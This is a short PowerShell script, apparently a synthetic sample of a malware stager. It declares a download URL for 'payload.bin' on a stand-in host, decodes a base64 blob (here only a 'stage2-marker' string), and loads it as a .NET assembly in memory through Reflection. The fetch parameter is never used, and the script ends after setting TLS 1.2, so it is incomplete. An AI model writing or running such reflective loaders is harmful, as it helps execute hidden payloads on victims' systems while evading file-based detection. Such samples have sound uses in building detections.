
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://adatum.com:80/payload.bin",
    [int]$TimeoutSec = 134
)
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpvbTQxa3ZpYzZz")
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
